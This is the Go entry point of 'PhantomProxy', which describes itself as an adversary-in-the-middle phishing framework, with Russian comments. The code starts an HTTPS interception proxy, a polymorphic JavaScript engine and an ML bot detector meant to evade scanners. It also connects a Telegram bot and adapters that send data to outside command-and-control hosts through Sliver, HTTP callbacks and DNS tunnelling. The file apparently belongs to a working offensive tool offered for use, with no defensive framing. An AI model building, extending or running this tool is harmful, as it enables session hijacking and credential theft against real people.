package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/fatih/color"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"

	"github.com/phantom-proxy/phantom-proxy/internal/api"
	"github.com/phantom-proxy/phantom-proxy/internal/config"
	"github.com/phantom-proxy/phantom-proxy/internal/c2"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/events"
	"github.com/phantom-proxy/phantom-proxy/internal/ml"
	"github.com/phantom-proxy/phantom-proxy/internal/modules"
	"github.com/phantom-proxy/phantom-proxy/internal/polymorphic"
	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
	"github.com/phantom-proxy/phantom-proxy/internal/telegram"
)

const (
	Version = "13.0.0"
	Banner  = `
██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗
██╔══██╗██╔═══██╗██║     ██║     ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║     ██║     ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║   ██║██║     ██║     ██║██║╚██╗██║██║   ██║
██║     ╚██████╔╝███████╗███████╗██║██║ ╚████║╚██████╔╝
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝

PhantomProxy v%s - AitM Framework Next Generation
`
)

func main() {
	configPath := flag.String("config", "config.yaml", "Путь к конфигурационному файлу")
	debug := flag.Bool("debug", false, "Режим отладки")
	version := flag.Bool("version", false, "Показать версию")

	flag.Parse()

	if *version {
		fmt.Printf("PhantomProxy v%s\n", Version)
		os.Exit(0)
	}

	color.Cyan(Banner, Version)

	logger, err := initLogger(*debug)
	if err != nil {
		color.Red("[!] Failed to initialize logger: %v", err)
		os.Exit(1)
	}
	defer logger.Sync()

	logger.Info("Starting PhantomProxy...", zap.String("version", Version))

	cfg, err := config.Load(*configPath)
	if err != nil {
		logger.Fatal("Failed to load config", zap.Error(err))
	}

	if *debug {
		cfg.Debug = true
	}

	logger.Info("Config loaded",
		zap.String("domain", cfg.Domain),
		zap.Int("https_port", cfg.HTTPSPort),
		zap.Bool("debug", cfg.Debug))

	db, err := database.NewDatabase(cfg.DatabasePath)
	if err != nil {
		logger.Fatal("Failed to initialize database", zap.Error(err))
	}
	defer db.Close()

	logger.Info("Database initialized", zap.String("path", cfg.DatabasePath))

	// Создание HTTP прокси
	httpProxy, err := proxy.NewHTTPProxy(cfg, db, logger)
	if err != nil {
		logger.Fatal("Failed to create HTTP proxy", zap.Error(err))
	}

	// Инициализация Polymorphic JS Engine
	if cfg.PolymorphicEnabled {
		polyEngine := polymorphic.NewEngine(cfg.PolymorphicLevel, 15)
		logger.Info("Polymorphic JS Engine initialized",
			zap.String("level", cfg.PolymorphicLevel))

		// Передаём движок в прокси
		httpProxy.SetPolymorphicEngine(polyEngine)
	}

	// Инициализация ML Bot Detector
	if cfg.MLDetection {
		botDetector := ml.NewBotDetector(logger, cfg.MLThreshold)
		logger.Info("ML Bot Detector initialized",
			zap.Float32("threshold", cfg.MLThreshold))

		// Передаём детектор в прокси
		httpProxy.SetBotDetector(botDetector)
	}

	// PhantomProxy v13: Event Bus и C2 интеграция
	eventBus := events.NewBus()
	httpProxy.SetEventBus(eventBus)

	c2Manager := buildC2Manager(&cfg.V13)
	c2Module := modules.NewC2IntegrationModule(c2Manager, db, logger)
	if err := c2Module.Init(context.Background(), eventBus); err != nil {
		logger.Warn("C2 integration module init failed", zap.Error(err))
	} else {
		logger.Info("PhantomProxy v13 C2 integration ready")
	}

	// Контекст для graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Обработка сигналов
	sigChan := make(chan os.Signal, 2)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		logger.Info("Shutdown signal received")
		cancel()
	}()

	// Запуск прокси
	logger.Info("Starting HTTP/HTTPS proxy",
		zap.String("bind", cfg.BindIP),
		zap.Int("port", cfg.HTTPSPort))

	go func() {
		if err := httpProxy.Start(ctx); err != nil {
			logger.Error("HTTP proxy error", zap.Error(err))
		}
	}()

	// Запуск API сервера
	if cfg.APIEnabled {
		apiServer := api.NewAPIServer(httpProxy, db, logger, cfg.APIKey)
		apiServer.SetEventBus(eventBus)

		logger.Info("Starting API server",
			zap.Int("port", cfg.APIPort))

		go func() {
			addr := fmt.Sprintf("%s:%d", cfg.BindIP, cfg.APIPort)
			if err := apiServer.Start(addr); err != nil {
				logger.Error("API server error", zap.Error(err))
			}
		}()
	}

	// Инициализация Telegram бота
	if cfg.TelegramEnabled && cfg.TelegramToken != "" {
		tgConfig := &telegram.Config{
			Token:   cfg.TelegramToken,
			ChatID:  cfg.TelegramChatID,
			Enabled: true,
		}
		tgBot, err := telegram.NewBot(tgConfig, db, logger)
		if err != nil {
			logger.Error("Failed to initialize Telegram bot", zap.Error(err))
		} else {
			if err := tgBot.Start(ctx); err != nil {
				logger.Error("Telegram bot error", zap.Error(err))
			}
		}
	}

	// Ожидание завершения
	<-ctx.Done()

	logger.Info("PhantomProxy stopped")
	color.Green("\n[*] Shutdown complete")
}

func buildC2Manager(v13 *config.V13Config) *c2.Manager {
	var adapters []c2.Adapter

	// Sliver
	if v13.C2.Sliver != nil {
		if enabled, ok := v13.C2.Sliver["enabled"].(bool); ok && enabled {
			adapters = append(adapters, c2.NewSliverAdapter(&c2.SliverConfig{
				Enabled:       true,
				ServerURL:     getStr(v13.C2.Sliver, "server_url"),
				OperatorToken: getStr(v13.C2.Sliver, "operator_token"),
				CallbackHost:  getStr(v13.C2.Sliver, "callback_host"),
			}))
		}
	}

	// HTTP Callback
	if v13.C2.HTTPCallback != nil {
		if enabled, ok := v13.C2.HTTPCallback["enabled"].(bool); ok && enabled {
			var headers []string
			if h, ok := v13.C2.HTTPCallback["headers"].([]interface{}); ok {
				for _, v := range h {
					if s, ok := v.(string); ok {
						headers = append(headers, s)
					}
				}
			}
			adapters = append(adapters, c2.NewHTTPCallbackAdapter(&c2.HTTPCallbackConfig{
				Enabled:     true,
				CallbackURL: getStr(v13.C2.HTTPCallback, "callback_url"),
				Headers:     headers,
			}))
		}
	}

	// DNS Tunnel
	if v13.C2.DNSTunnel != nil {
		if enabled, ok := v13.C2.DNSTunnel["enabled"].(bool); ok && enabled {
			chunk := 60
			if c, ok := v13.C2.DNSTunnel["chunk_size"].(int); ok {
				chunk = c
			}
			adapters = append(adapters, c2.NewDNSTunnelAdapter(&c2.DNSTunnelConfig{
				Enabled:   true,
				Domain:    getStr(v13.C2.DNSTunnel, "domain"),
				ChunkSize: chunk,
			}))
		}
	}

	return c2.NewManager(adapters...)
}

func getStr(m map[string]interface{}, key string) string {
	if v, ok := m[key].(string); ok {
		return v
	}
	return ""
}

func initLogger(debug bool) (*zap.Logger, error) {
	cfg := zap.NewProductionConfig()

	if debug {
		cfg.Level = zap.NewAtomicLevelAt(zap.DebugLevel)
		cfg.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder
		cfg.EncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
	}

	return cfg.Build()
}
